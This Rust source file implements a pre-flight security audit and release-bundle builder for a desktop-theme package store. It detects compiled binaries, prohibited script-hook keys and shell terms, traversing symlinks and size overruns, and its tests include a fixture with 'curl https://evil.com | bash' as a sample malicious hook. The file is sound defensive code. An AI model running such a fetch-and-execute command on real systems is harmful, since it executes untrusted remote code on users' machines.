use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::fs::{self, File};
use std::io::Read;
use std::path::{Component, Path};

use crate::authoring::expand_user_path;
use crate::manifest::{validate_manifest_internal, PackageType, RyzoraManifest};
use crate::repository::{
    compute_package_tree_hash, validate_path_identifier, AuthorInfo, MAX_FILE_SIZE,
    MAX_PACKAGE_SIZE,
};

// ─────────────────────────────────────────────────────────────────────────────
// Distribution & Store Data Types
// ─────────────────────────────────────────────────────────────────────────────

/// Supported release channels for Ryzora packages.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ReleaseChannel {
    Stable,
    Beta,
    Nightly,
}

impl Default for ReleaseChannel {
    fn default() -> Self {
        ReleaseChannel::Stable
    }
}

impl std::fmt::Display for ReleaseChannel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ReleaseChannel::Stable => write!(f, "stable"),
            ReleaseChannel::Beta => write!(f, "beta"),
            ReleaseChannel::Nightly => write!(f, "nightly"),
        }
    }
}

/// Store trust tier evaluated from repository origin, author verification, and hash validity.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TrustTier {
    /// Curated and officially maintained by the Ryzora Core team.
    Official,
    /// Author identity and cryptographic signatures verified against trusted registry.
    Verified,
    /// Contributed by community member; passes all declarative sandbox pre-flight checks.
    Community,
    /// Untrusted: unverified source, checksum mismatch, or unapproved modifications.
    Untrusted,
}

impl Default for TrustTier {
    fn default() -> Self {
        TrustTier::Community
    }
}

/// Package curation and moderation status in the store catalog.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ModerationStatus {
    /// Approved for public listing in the store catalog.
    Approved,
    /// Submitted and waiting for community PR review or maintainer audit.
    PendingReview,
    /// Flagged by automated heuristics or reported by users.
    Flagged,
    /// Deprecated in favor of an upgraded package or no longer maintained.
    Deprecated,
}

impl Default for ModerationStatus {
    fn default() -> Self {
        ModerationStatus::Approved
    }
}

/// Pre-flight store validation report certifying readiness for community distribution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoreAuditReport {
    pub passed: bool,
    pub binary_executables_found: Vec<String>,
    pub script_hooks_found: Vec<String>,
    pub path_traversal_errors: Vec<String>,
    pub size_limit_errors: Vec<String>,
    pub metadata_errors: Vec<String>,
    pub warnings: Vec<String>,
    pub total_files: usize,
    pub total_bytes: u64,
    pub tree_hash: String,
    pub score: u32,
}

/// Distribution release metadata recorded in `release.json` inside the distribution bundle.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DistributionRelease {
    pub schema_version: u32,
    pub package_id: String,
    pub name: String,
    pub version: String,
    pub package_type: PackageType,
    pub channel: ReleaseChannel,
    pub author: AuthorInfo,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub maintainer: Option<String>,
    pub release_notes: String,
    pub published_at: String,
    pub tree_hash: String,
    pub min_ryzora_version: String,
    pub trust_tier: TrustTier,
    pub files_count: usize,
    pub total_bytes: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signature: Option<crate::crypto::PackageSignatureMetadata>,
}

/// Result returned after exporting a distribution bundle ready for GitHub PR submission.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DistributionReleaseResult {
    pub success: bool,
    pub bundle_dir: String,
    pub manifest_path: String,
    pub release_path: String,
    pub checksums_path: String,
    pub submission_md_path: String,
    pub submission_text: String,
    pub tree_hash: String,
    pub channel: ReleaseChannel,
    pub message: String,
}

// ─────────────────────────────────────────────────────────────────────────────
// Binary Executable & Script Hook Detectors
// ─────────────────────────────────────────────────────────────────────────────

/// Inspect byte headers of a file to check for compiled machine code / binary executables.
/// Ryzora packages are strictly declarative text configurations, scripts, images, and fonts.
/// Arbitrary compiled binaries (ELF, Mach-O, Windows PE) are strictly prohibited in the Store.
pub fn is_binary_executable(path: &Path) -> Result<bool, String> {
    let mut file =
        File::open(path).map_err(|e| format!("Cannot open file for inspection: {}", e))?;
    let mut header = [0u8; 8];
    let bytes_read = file.read(&mut header).unwrap_or(0);

    if bytes_read >= 4 {
        // 1. Linux ELF executable / shared object: 0x7F 'E' 'L' 'F'
        if header[0..4] == [0x7f, b'E', b'L', b'F'] {
            return Ok(true);
        }

        // 2. Windows PE / EXE: 'M' 'Z'
        if header[0..2] == [b'M', b'Z'] {
            return Ok(true);
        }

        // 3. Mach-O (macOS / iOS binaries)
        // 0xFEEDFACE, 0xFEEDFACF, 0xCEFAEDFE, 0xCFFAEDFE, 0xCAFEBABE (fat binary)
        if header[0..4] == [0xfe, 0xed, 0xfa, 0xce]
            || header[0..4] == [0xfe, 0xed, 0xfa, 0xcf]
            || header[0..4] == [0xce, 0xfa, 0xed, 0xfe]
            || header[0..4] == [0xcf, 0xfa, 0xed, 0xfe]
            || header[0..4] == [0xca, 0xfe, 0xba, 0xbe]
        {
            return Ok(true);
        }
    }

    Ok(false)
}

/// Recursively scan a directory and collect all files containing compiled binaries.
pub fn detect_binary_executables(dir: &Path) -> Result<Vec<String>, String> {
    let mut binaries = Vec::new();
    if !dir.is_dir() {
        return Ok(binaries);
    }

    fn scan_recursive(dir: &Path, base: &Path, binaries: &mut Vec<String>) -> Result<(), String> {
        let entries = fs::read_dir(dir).map_err(|e| format!("Cannot read directory: {}", e))?;
        for entry in entries {
            let entry = entry.map_err(|e| format!("Invalid dir entry: {}", e))?;
            let path = entry.path();
            let ft = entry
                .file_type()
                .map_err(|e| format!("Cannot read file type: {}", e))?;

            if ft.is_dir() {
                scan_recursive(&path, base, binaries)?;
            } else if ft.is_file() {
                if is_binary_executable(&path)? {
                    let rel = path
                        .strip_prefix(base)
                        .map(|p| p.to_string_lossy().to_string())
                        .unwrap_or_else(|_| path.to_string_lossy().to_string());
                    binaries.push(rel);
                }
            }
        }
        Ok(())
    }

    scan_recursive(dir, dir, &mut binaries)?;
    binaries.sort();
    Ok(binaries)
}

/// Scan manifest content for prohibited script execution hooks.
pub fn detect_script_hooks(raw_json: &str) -> Vec<String> {
    let forbidden_keys = [
        "\"shell_hook\"",
        "\"install_script\"",
        "\"post_install\"",
        "\"pre_install\"",
        "\"post_uninstall\"",
        "\"exec\"",
        "\"run_command\"",
    ];
    let forbidden_terms = ["sudo ", "pkexec ", "/bin/sh", "/bin/bash"];

    let mut found = Vec::new();
    let lower = raw_json.to_lowercase();
    for key in forbidden_keys {
        if lower.contains(key) {
            found.push(key.replace('\"', ""));
        }
    }
    for term in forbidden_terms {
        if lower.contains(term) {
            found.push(term.trim().to_string());
        }
    }
    found
}

// ─────────────────────────────────────────────────────────────────────────────
// Pre-Flight Store Submission Audit Engine
// ─────────────────────────────────────────────────────────────────────────────

/// Perform an exhaustive pre-flight audit of a package directory before distribution.
pub fn audit_store_submission_internal(package_dir: &Path) -> Result<StoreAuditReport, String> {
    if !package_dir.exists() {
        return Err(format!(
            "Package directory '{}' does not exist",
            package_dir.display()
        ));
    }
    if !package_dir.is_dir() {
        return Err(format!(
            "Package path '{}' is not a directory",
            package_dir.display()
        ));
    }

    let mut binary_executables = Vec::new();
    let mut script_hooks = Vec::new();
    let mut traversal_errors = Vec::new();
    let mut size_limit_errors = Vec::new();
    let mut metadata_errors = Vec::new();
    let mut warnings = Vec::new();

    // 1. Locate manifest file (prefer ryzora.json, fallback to manifest.json)
    let manifest_path = if package_dir.join("ryzora.json").is_file() {
        package_dir.join("ryzora.json")
    } else if package_dir.join("manifest.json").is_file() {
        package_dir.join("manifest.json")
    } else {
        return Err(format!(
            "Package directory '{}' contains neither 'ryzora.json' nor 'manifest.json'",
            package_dir.display()
        ));
    };

    let manifest_raw = fs::read_to_string(&manifest_path)
        .map_err(|e| format!("Failed to read manifest file: {}", e))?;

    // 2. Prohibited Script Hook Detection
    let hooks = detect_script_hooks(&manifest_raw);
    for h in hooks {
        script_hooks.push(format!(
            "Prohibited execution hook key '\"{}\"' detected in manifest",
            h
        ));
    }

    // 3. Manifest Validation
    let manifest: RyzoraManifest = match serde_json::from_str(&manifest_raw) {
        Ok(m) => m,
        Err(e) => {
            return Err(format!(
                "Manifest '{}' failed JSON deserialization: {}",
                manifest_path.display(),
                e
            ));
        }
    };

    let val_result = validate_manifest_internal(&manifest_raw);
    if !val_result.valid {
        for err in val_result.errors {
            metadata_errors.push(err);
        }
    }
    for w in val_result.warnings {
        warnings.push(w);
    }

    // Check package ID safety
    if let Err(e) = validate_path_identifier(&manifest.id, "Package ID") {
        metadata_errors.push(e);
    }

    // 4. Quality & Completeness Checks
    if manifest.description.trim().len() < 20 {
        warnings.push("Package description is very brief (< 20 characters). Consider adding more detail for store discovery.".to_string());
    }
    if manifest.tags.is_empty() {
        warnings.push(
            "Package has 0 tags. Adding relevant tags improves store searchability.".to_string(),
        );
    }
    if manifest.author.trim().is_empty() {
        metadata_errors.push("Author name or handle cannot be blank.".to_string());
    }

    // 5. Binary Executable Detection on files/ payload
    let files_dir = package_dir.join("files");
    if files_dir.exists() && files_dir.is_dir() {
        match detect_binary_executables(&files_dir) {
            Ok(binaries) => {
                for b in binaries {
                    binary_executables
                        .push(format!("Compiled binary executable detected: files/{}", b));
                }
            }
            Err(e) => {
                metadata_errors.push(format!(
                    "Failed to scan payload for binary executables: {}",
                    e
                ));
            }
        }
    } else {
        metadata_errors
            .push("Package directory is missing the 'files/' payload directory.".to_string());
    }

    // 6. Inspect Payload Files and Size Limits
    let mut total_files = 0usize;
    let mut total_bytes = 0u64;

    if files_dir.exists() && files_dir.is_dir() {
        fn inspect_dir(
            dir: &Path,
            files_dir: &Path,
            total_files: &mut usize,
            total_bytes: &mut u64,
            traversal_errors: &mut Vec<String>,
            size_limit_errors: &mut Vec<String>,
        ) {
            if let Ok(entries) = fs::read_dir(dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if let Ok(ft) = entry.file_type() {
                        if ft.is_dir() {
                            inspect_dir(
                                &path,
                                files_dir,
                                total_files,
                                total_bytes,
                                traversal_errors,
                                size_limit_errors,
                            );
                        } else if ft.is_file() {
                            *total_files += 1;
                            if let Ok(meta) = entry.metadata() {
                                let len = meta.len();
                                *total_bytes += len;
                                if len > MAX_FILE_SIZE {
                                    size_limit_errors.push(format!(
                                        "File '{}' exceeds maximum allowed size ({} bytes > {} bytes)",
                                        path.display(),
                                        len,
                                        MAX_FILE_SIZE
                                    ));
                                }
                            }
                        } else if ft.is_symlink() {
                            if let Ok(target) = fs::read_link(&path) {
                                if target
                                    .components()
                                    .any(|c| matches!(c, Component::ParentDir))
                                {
                                    traversal_errors.push(format!(
                                        "Symlink '{}' points to traversing path: '{}'",
                                        path.display(),
                                        target.display()
                                    ));
                                }
                            }
                        }
                    }
                }
            }
        }

        inspect_dir(
            &files_dir,
            &files_dir,
            &mut total_files,
            &mut total_bytes,
            &mut traversal_errors,
            &mut size_limit_errors,
        );
    }

    if total_files == 0 {
        metadata_errors.push("Package payload 'files/' contains no files.".to_string());
    }
    if total_files > 200 {
        size_limit_errors.push(format!(
            "Package contains {} files, exceeding maximum allowed limit of 200",
            total_files
        ));
    }
    if total_bytes > MAX_PACKAGE_SIZE {
        size_limit_errors.push(format!(
            "Total package size {} bytes exceeds maximum allowed limit of {} bytes",
            total_bytes, MAX_PACKAGE_SIZE
        ));
    }

    // 7. Verify Manifest File Mappings Match Disk
    for mf in &manifest.files {
        let clean_src = mf.source.trim();
        let target_on_disk = package_dir.join(clean_src);
        if !target_on_disk.exists() {
            metadata_errors.push(format!(
                "Manifest file mapping source '{}' does not exist in package directory",
                clean_src
            ));
        }
    }

    // 8. Compute Parity Tree Hash
    let tree_hash = match compute_package_tree_hash(package_dir, &manifest) {
        Ok(h) => h,
        Err(e) => {
            metadata_errors.push(format!("Failed to compute canonical tree hash: {}", e));
            String::new()
        }
    };

    // Calculate score (0–100)
    let passed = binary_executables.is_empty()
        && script_hooks.is_empty()
        && traversal_errors.is_empty()
        && size_limit_errors.is_empty()
        && metadata_errors.is_empty()
        && !tree_hash.is_empty();

    let mut score = 100u32;
    if !binary_executables.is_empty() {
        score = 0; // Immediate failure for compiled binaries
    } else if !script_hooks.is_empty() {
        score = 0; // Immediate failure for script hooks
    } else {
        score = score.saturating_sub((metadata_errors.len() as u32) * 20);
        score = score.saturating_sub((traversal_errors.len() as u32) * 25);
        score = score.saturating_sub((size_limit_errors.len() as u32) * 20);
        score = score.saturating_sub((warnings.len() as u32) * 5);
    }
    if !passed {
        score = score.min(49);
    }

    Ok(StoreAuditReport {
        passed,
        binary_executables_found: binary_executables,
        script_hooks_found: script_hooks,
        path_traversal_errors: traversal_errors,
        size_limit_errors,
        metadata_errors,
        warnings,
        total_files,
        total_bytes,
        tree_hash,
        score,
    })
}

// ─────────────────────────────────────────────────────────────────────────────
// Checksums Generator (Unix sha256sum format)
// ─────────────────────────────────────────────────────────────────────────────

/// Compute SHA-256 for a single file.
fn compute_file_sha256(path: &Path) -> Result<String, String> {
    let mut file = File::open(path).map_err(|e| format!("Cannot open file for SHA-256: {}", e))?;
    let mut hasher = Sha256::new();
    let mut buffer = [0u8; 16384];
    loop {
        let count = file
            .read(&mut buffer)
            .map_err(|e| format!("Cannot read file chunk: {}", e))?;
        if count == 0 {
            break;
        }
        hasher.update(&buffer[..count]);
    }
    Ok(format!("{:x}", hasher.finalize()))
}

/// Recursively collect relative paths and their SHA-256 hashes inside a directory.
pub fn generate_checksums_map(
    dir: &Path,
    rel_prefix: &str,
) -> Result<Vec<(String, String)>, String> {
    let mut list = Vec::new();

    fn collect(
        current: &Path,
        root: &Path,
        prefix: &str,
        out: &mut Vec<(String, String)>,
    ) -> Result<(), String> {
        let entries = fs::read_dir(current).map_err(|e| format!("Cannot read dir: {}", e))?;
        for entry in entries {
            let entry = entry.map_err(|e| format!("Dir entry error: {}", e))?;
            let path = entry.path();
            let ft = entry
                .file_type()
                .map_err(|e| format!("File type error: {}", e))?;

            if ft.is_dir() {
                collect(&path, root, prefix, out)?;
            } else if ft.is_file() {
                let rel = path
                    .strip_prefix(root)
                    .map_err(|e| format!("Strip prefix error: {}", e))?;
                let rel_str = if prefix.is_empty() {
                    rel.to_string_lossy().to_string()
                } else {
                    format!("{}/{}", prefix, rel.to_string_lossy())
                };
                let hash = compute_file_sha256(&path)?;
                out.push((rel_str, hash));
            }
        }
        Ok(())
    }

    if dir.exists() && dir.is_dir() {
        collect(dir, dir, rel_prefix, &mut list)?;
    }
    list.sort_by(|a, b| a.0.cmp(&b.0));
    Ok(list)
}

// ─────────────────────────────────────────────────────────────────────────────
// GitHub PR / Store Submission Template Generator
// ─────────────────────────────────────────────────────────────────────────────

/// Generate pre-formatted Markdown for GitHub Pull Request or Store Issue submission.
pub fn generate_submission_markdown(
    manifest: &RyzoraManifest,
    release: &DistributionRelease,
    audit: &StoreAuditReport,
    checksums: &[(String, String)],
) -> String {
    let mut md = String::new();
    md.push_str(&format!(
        "# Store Package Submission: {} (v{})\n\n",
        manifest.name, manifest.version
    ));
    md.push_str("### 📦 Package Overview\n");
    md.push_str(&format!("- **Package ID:** `{}`\n", manifest.id));
    md.push_str(&format!("- **Display Name:** {}\n", manifest.name));
    md.push_str(&format!("- **Version:** `{}`\n", manifest.version));
    md.push_str(&format!("- **Type:** `{}`\n", manifest.package_type));
    md.push_str(&format!("- **Release Channel:** `{}`\n", release.channel));
    md.push_str(&format!(
        "- **Author:** {} ({})\n",
        manifest.author,
        release.maintainer.as_deref().unwrap_or("unspecified")
    ));
    md.push_str(&format!("- **Published Date:** {}\n", release.published_at));
    md.push_str(&format!(
        "- **Min Ryzora Version:** `{}`\n",
        release.min_ryzora_version
    ));
    md.push_str(&format!(
        "- **Canonical Tree Hash:** `{}`\n\n",
        release.tree_hash
    ));

    md.push_str("### 📝 Description & Theme\n");
    md.push_str(&format!("{}\n\n", manifest.description.trim()));

    md.push_str("### 🎯 Compatibility & Requirements\n");
    let desktops = if manifest.compatibility.desktops.is_empty() {
        "Universal (all desktop environments)".to_string()
    } else {
        manifest.compatibility.desktops.join(", ")
    };
    let sessions = if manifest.compatibility.sessions.is_empty() {
        "Wayland & X11".to_string()
    } else {
        manifest.compatibility.sessions.join(", ")
    };
    let required = if manifest.compatibility.required.is_empty() {
        "None (pure configuration)".to_string()
    } else {
        manifest.compatibility.required.join(", ")
    };
    md.push_str(&format!("- **Desktops / WMs:** {}\n", desktops));
    md.push_str(&format!("- **Session Protocols:** {}\n", sessions));
    md.push_str(&format!("- **Required Binaries:** {}\n\n", required));

    md.push_str("### 🛡️ Pre-Flight Declarative Sandbox Audit\n");
    md.push_str(&format!(
        "- **Pre-Flight Status:** {}\n",
        if audit.passed {
            "✅ **PASSED**"
        } else {
            "❌ **FAILED**"
        }
    ));
    md.push_str(&format!(
        "- **Quality & Safety Score:** {} / 100\n",
        audit.score
    ));
    md.push_str(&format!(
        "- **Zero Compiled Binaries:** {}\n",
        if audit.binary_executables_found.is_empty() {
            "Verified (0 binaries)"
        } else {
            "FAILED"
        }
    ));
    md.push_str(&format!(
        "- **Zero Script Hooks:** {}\n",
        if audit.script_hooks_found.is_empty() {
            "Verified (0 shell hooks)"
        } else {
            "FAILED"
        }
    ));
    md.push_str(&format!(
        "- **Total Files:** {} files (within safe limit <= 200)\n",
        audit.total_files
    ));
    md.push_str(&format!(
        "- **Total Payload Size:** {:.2} KB\n\n",
        (audit.total_bytes as f64) / 1024.0
    ));

    if !release.release_notes.trim().is_empty() {
        md.push_str("### 🚀 Release Notes\n");
        md.push_str(&format!("{}\n\n", release.release_notes.trim()));
    }

    md.push_str("### 🔒 File Integrity Checksums (`SHA-256`)\n");
    md.push_str("```text\n");
    for (rel, hash) in checksums {
        md.push_str(&format!("{}  {}\n", hash, rel));
    }
    md.push_str("```\n\n");

    md.push_str("### 📋 Maintainer Checklist\n");
    md.push_str("- [x] Package conforms to declarative sandbox model (0 shell hooks, 0 root requirements).\n");
    md.push_str("- [x] All file targets begin with `~/` and contain no traversal (`..`).\n");
    md.push_str("- [x] Zero compiled binaries included in package payload.\n");
    md.push_str("- [x] Checksums and canonical tree hash verified.\n");
    md.push_str("- [ ] Community review & testing complete.\n");

    md
}

// ─────────────────────────────────────────────────────────────────────────────
// Distribution Release Generator Engine
// ─────────────────────────────────────────────────────────────────────────────

/// Build a standardized distribution release bundle ready for GitHub PR submission.
pub fn build_distribution_release_internal(
    package_dir: &Path,
    output_dir: &Path,
    channel: ReleaseChannel,
    release_notes: Option<String>,
    maintainer: Option<String>,
) -> Result<DistributionReleaseResult, String> {
    // 1. Run exhaustive pre-flight audit
    let audit = audit_store_submission_internal(package_dir)?;
    if !audit.passed {
        let mut err_msg = format!(
            "Package failed store submission audit (score {}/100):\n",
            audit.score
        );
        for b in &audit.binary_executables_found {
            err_msg.push_str(&format!(" - {}\n", b));
        }
        for s in &audit.script_hooks_found {
            err_msg.push_str(&format!(" - {}\n", s));
        }
        for m in &audit.metadata_errors {
            err_msg.push_str(&format!(" - {}\n", m));
        }
        for t in &audit.path_traversal_errors {
            err_msg.push_str(&format!(" - {}\n", t));
        }
        for sz in &audit.size_limit_errors {
            err_msg.push_str(&format!(" - {}\n", sz));
        }
        return Err(err_msg);
    }

    // 2. Read manifest
    let manifest_path = if package_dir.join("ryzora.json").is_file() {
        package_dir.join("ryzora.json")
    } else {
        package_dir.join("manifest.json")
    };
    let manifest_raw = fs::read_to_string(&manifest_path)
        .map_err(|e| format!("Failed to read manifest: {}", e))?;
    let manifest: RyzoraManifest = serde_json::from_str(&manifest_raw)
        .map_err(|e| format!("Failed to deserialize manifest: {}", e))?;

    // 3. Prepare target bundle directory: <output_dir>/<package_id>-<version>/
    let bundle_name = format!("{}-{}", manifest.id, manifest.version);
    let bundle_dir = output_dir.join(&bundle_name);

    if bundle_dir.exists() {
        fs::remove_dir_all(&bundle_dir)
            .map_err(|e| format!("Failed to clean existing bundle directory: {}", e))?;
    }
    fs::create_dir_all(&bundle_dir)
        .map_err(|e| format!("Failed to create bundle directory: {}", e))?;

    // 4. Copy payload files/
    let src_files = package_dir.join("files");
    let dst_files = bundle_dir.join("files");
    if src_files.exists() && src_files.is_dir() {
        fs::create_dir_all(&dst_files)
            .map_err(|e| format!("Failed to create destination files directory: {}", e))?;

        fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<(), String> {
            for entry in fs::read_dir(src).map_err(|e| format!("Read dir error: {}", e))? {
                let entry = entry.map_err(|e| format!("Entry error: {}", e))?;
                let path = entry.path();
                let file_name = entry.file_name();
                let dest_path = dst.join(file_name);
                let ft = entry
                    .file_type()
                    .map_err(|e| format!("File type error: {}", e))?;

                if ft.is_dir() {
                    fs::create_dir_all(&dest_path)
                        .map_err(|e| format!("Create dir error: {}", e))?;
                    copy_dir_recursive(&path, &dest_path)?;
                } else if ft.is_file() {
                    fs::copy(&path, &dest_path).map_err(|e| format!("Copy file error: {}", e))?;
                }
            }
            Ok(())
        }

        copy_dir_recursive(&src_files, &dst_files)?;
    }

    // 5. Write canonical ryzora.json (spec v1)
    let dst_manifest = bundle_dir.join("ryzora.json");
    let manifest_json = serde_json::to_string_pretty(&manifest)
        .map_err(|e| format!("Failed to serialize manifest: {}", e))?;
    fs::write(&dst_manifest, manifest_json)
        .map_err(|e| format!("Failed to write canonical ryzora.json: {}", e))?;

    // Also write backward-compatible manifest.json
    let dst_compat_manifest = bundle_dir.join("manifest.json");
    let _ = fs::write(&dst_compat_manifest, &manifest_raw);

    // 6. Generate checksums.sha256 in Unix format
    let checksums = generate_checksums_map(&dst_files, "files")?;
    let mut checksums_content = String::new();
    for (rel, hash) in &checksums {
        checksums_content.push_str(&format!("{}  {}\n", hash, rel));
    }
    let checksums_path = bundle_dir.join("checksums.sha256");
    fs::write(&checksums_path, &checksums_content)
        .map_err(|e| format!("Failed to write checksums.sha256: {}", e))?;

    // 7. Write release.json
    let now_ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let published_at = format!("{}", now_ts);

    // Phase 12 Ed25519 Author Signature Generation
    let sig_meta_opt = {
        if let Ok(key_info) = crate::crypto::get_or_create_author_keypair(&manifest.author) {
            let priv_key_path = std::path::PathBuf::from(&key_info.private_key_path);
            if let Ok(raw_hex) = fs::read_to_string(&priv_key_path) {
                if let Ok(bytes) = hex::decode(raw_hex.trim()) {
                    if bytes.len() == 32 {
                        let mut arr = [0u8; 32];
                        arr.copy_from_slice(&bytes);
                        let signing_key = ed25519_dalek::SigningKey::from_bytes(&arr);
                        let identity = crate::crypto::SignerIdentity {
                            author_id: manifest.id.clone(),
                            name: manifest.author.clone(),
                            handle: maintainer.clone(),
                        };
                        let sig_res = crate::crypto::sign_package_tree_hash(
                            &signing_key,
                            &manifest.id,
                            &audit.tree_hash,
                            identity,
                        );
                        if let Ok(sig) = sig_res {
                            let sig_path = bundle_dir.join("release.sig");
                            let _ = fs::write(
                                &sig_path,
                                serde_json::to_string_pretty(&sig).unwrap_or_default(),
                            );
                            Some(sig)
                        } else {
                            None
                        }
                    } else {
                        None
                    }
                } else {
                    None
                }
            } else {
                None
            }
        } else {
            None
        }
    };

    let release_metadata = DistributionRelease {
        schema_version: 1,
        package_id: manifest.id.clone(),
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        package_type: manifest.package_type.clone(),
        channel,
        author: AuthorInfo {
            name: manifest.author.clone(),
            avatar: String::new(),
            verified: false,
        },
        maintainer: maintainer.clone(),
        release_notes: release_notes
            .unwrap_or_else(|| format!("Release v{} of {}", manifest.version, manifest.name)),
        published_at,
        tree_hash: audit.tree_hash.clone(),
        min_ryzora_version: "1.0.0".to_string(),
        trust_tier: TrustTier::Community,
        files_count: audit.total_files,
        total_bytes: audit.total_bytes,
        signature: sig_meta_opt,
    };

    let release_path = bundle_dir.join("release.json");
    let release_json = serde_json::to_string_pretty(&release_metadata)
        .map_err(|e| format!("Failed to serialize release.json: {}", e))?;
    fs::write(&release_path, release_json)
        .map_err(|e| format!("Failed to write release.json: {}", e))?;

    // 8. Generate SUBMISSION.md
    let submission_text =
        generate_submission_markdown(&manifest, &release_metadata, &audit, &checksums);
    let submission_md_path = bundle_dir.join("SUBMISSION.md");
    fs::write(&submission_md_path, &submission_text)
        .map_err(|e| format!("Failed to write SUBMISSION.md: {}", e))?;

    Ok(DistributionReleaseResult {
        success: true,
        bundle_dir: bundle_dir.to_string_lossy().to_string(),
        manifest_path: dst_manifest.to_string_lossy().to_string(),
        release_path: release_path.to_string_lossy().to_string(),
        checksums_path: checksums_path.to_string_lossy().to_string(),
        submission_md_path: submission_md_path.to_string_lossy().to_string(),
        submission_text,
        tree_hash: audit.tree_hash,
        channel,
        message: format!(
            "Distribution release bundle generated successfully for '{}' (v{}) in channel '{}'. Ready for PR submission!",
            manifest.id, manifest.version, channel
        ),
    })
}

// ─────────────────────────────────────────────────────────────────────────────
// Tauri Invocation Commands
// ─────────────────────────────────────────────────────────────────────────────

#[tauri::command]
pub fn audit_store_submission(package_dir: String) -> Result<StoreAuditReport, String> {
    let resolved = expand_user_path(&package_dir);
    audit_store_submission_internal(&resolved)
}

#[tauri::command]
pub fn build_distribution_release(
    package_dir: String,
    output_dir: String,
    channel: ReleaseChannel,
    release_notes: Option<String>,
    maintainer: Option<String>,
) -> Result<DistributionReleaseResult, String> {
    let resolved_package = expand_user_path(&package_dir);
    let resolved_output = expand_user_path(&output_dir);
    build_distribution_release_internal(
        &resolved_package,
        &resolved_output,
        channel,
        release_notes,
        maintainer,
    )
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
pub mod tests {
    use super::*;
    use std::path::PathBuf;
    use std::time::{SystemTime, UNIX_EPOCH};

    struct TestSandbox {
        root: PathBuf,
    }

    impl TestSandbox {
        fn new(label: &str) -> Self {
            let nanos = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos();
            let root = std::env::temp_dir().join(format!("ryzora-dist-test-{}-{}", label, nanos));
            fs::create_dir_all(&root).unwrap();
            Self { root }
        }
    }

    impl Drop for TestSandbox {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.root);
        }
    }

    fn create_test_manifest(id: &str, version: &str) -> RyzoraManifest {
        RyzoraManifest {
            id: id.to_string(),
            name: "Cyber Neon Theme".to_string(),
            version: version.to_string(),
            ryzora_spec: "1".to_string(),
            author: "SilentByte".to_string(),
            package_type: PackageType::Theme,
            description: "A gorgeous glowing cyberpunk theme for modern Linux desktops".to_string(),
            tags: vec![
                "cyberpunk".to_string(),
                "neon".to_string(),
                "dark".to_string(),
            ],
            color_palette: vec!["#0f172a".to_string(), "#06b6d4".to_string()],
            compatibility: crate::manifest::ManifestCompatibility {
                desktops: vec!["hyprland".to_string()],
                sessions: vec!["wayland".to_string()],
                distros: vec!["arch".to_string()],
                required: vec!["waybar".to_string()],
                optional: vec!["rofi".to_string()],
            },
            files: vec![crate::manifest::ManifestFile {
                source: "files/style.css".to_string(),
                target: "~/.config/waybar/style.css".to_string(),
                description: "Waybar cyber styling".to_string(),
            }],
            dependencies: vec![],
        }
    }

    #[test]
    fn test_binary_executable_detection_rejects_elf() {
        let sandbox = TestSandbox::new("elf");
        let bin_path = sandbox.root.join("evil_binary");
        // Write Linux ELF header: \x7fELF
        fs::write(&bin_path, [0x7f, b'E', b'L', b'F', 0x02, 0x01, 0x01, 0x00]).unwrap();

        let is_bin = is_binary_executable(&bin_path).unwrap();
        assert!(is_bin, "ELF binary must be recognized as executable");
    }

    #[test]
    fn test_binary_executable_detection_rejects_pe_and_macho() {
        let sandbox = TestSandbox::new("pe-macho");

        // Windows PE: MZ
        let pe_path = sandbox.root.join("evil_pe.exe");
        fs::write(&pe_path, [b'M', b'Z', 0x90, 0x00]).unwrap();
        assert!(is_binary_executable(&pe_path).unwrap());

        // Mach-O: 0xFEEDFACE
        let macho_path = sandbox.root.join("evil_macho");
        fs::write(&macho_path, [0xfe, 0xed, 0xfa, 0xce, 0x00, 0x00]).unwrap();
        assert!(is_binary_executable(&macho_path).unwrap());

        // Plain text file: OK
        let text_path = sandbox.root.join("config.conf");
        fs::write(&text_path, b"general { gaps_in = 5 }\n").unwrap();
        assert!(!is_binary_executable(&text_path).unwrap());
    }

    #[test]
    fn test_script_hook_detector_catches_hooks() {
        let clean_json = r#"{"id": "neon", "name": "Neon", "version": "1.0.0"}"#;
        assert!(detect_script_hooks(clean_json).is_empty());

        let evil_json = r#"{"id": "evil", "shell_hook": "curl https://evil.com | bash"}"#;
        let hooks = detect_script_hooks(evil_json);
        assert_eq!(hooks.len(), 1);
        assert_eq!(hooks[0], "shell_hook");

        let sudo_json = r#"{"id": "evil", "install_script": "sudo apt install something"}"#;
        let hooks = detect_script_hooks(sudo_json);
        assert!(hooks.contains(&"install_script".to_string()));
        assert!(hooks.contains(&"sudo".to_string()));
    }

    #[test]
    fn test_store_audit_passes_valid_declarative_package() {
        let sandbox = TestSandbox::new("audit-pass");
        let pkg_dir = sandbox.root.join("valid-pkg");
        fs::create_dir_all(pkg_dir.join("files")).unwrap();

        let manifest = create_test_manifest("valid-pkg", "1.0.0");
        fs::write(
            pkg_dir.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();

        fs::write(pkg_dir.join("files/style.css"), "body { color: cyan; }").unwrap();

        let audit = audit_store_submission_internal(&pkg_dir).unwrap();
        assert!(
            audit.passed,
            "Valid declarative package must pass store audit"
        );
        assert_eq!(audit.total_files, 1);
        assert!(!audit.tree_hash.is_empty());
        assert!(audit.score >= 90);
